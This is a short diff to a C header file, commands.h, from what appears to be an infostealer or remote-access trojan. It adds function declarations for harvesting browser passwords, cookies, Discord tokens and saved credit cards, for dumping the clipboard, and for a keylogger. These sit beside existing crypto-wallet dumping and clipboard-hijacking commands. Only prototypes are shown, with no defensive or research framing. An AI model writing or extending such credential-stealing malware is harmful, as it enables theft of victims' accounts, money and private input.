@@ -68,9 +68,26 @@ int cmd_reg_delete(const char *keypath, const char *valname,
                    char *output_buf, size_t output_size);
 
 int cmd_browser_dump(const char *args, char *output_buf, size_t output_size);
+int cmd_browser_creds(const char *args, char *output_buf, size_t output_size);
+int cmd_browser_cookies(const char *args, char *output_buf, size_t output_size);
+int cmd_discord_tokens(const char *args, char *output_buf, size_t output_size);
+int cmd_browser_cc(const char *args, char *output_buf, size_t output_size);
 
 int cmd_crypto_dump(const char *args, char *output_buf, size_t output_size);
 
 int cmd_clipjack(const char *args, char *output_buf, size_t output_size);
+
+int cmd_clipboard_dump(const char *args, char *output_buf, size_t output_size);
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+void keylogger_start(void);
+void keylogger_stop(void);
+int  keylogger_get(char *buf, size_t bufsz);
+int  keylogger_is_active(void);
+#ifdef __cplusplus
+}
+#endif
 
 #endif /* COMMANDS_H */
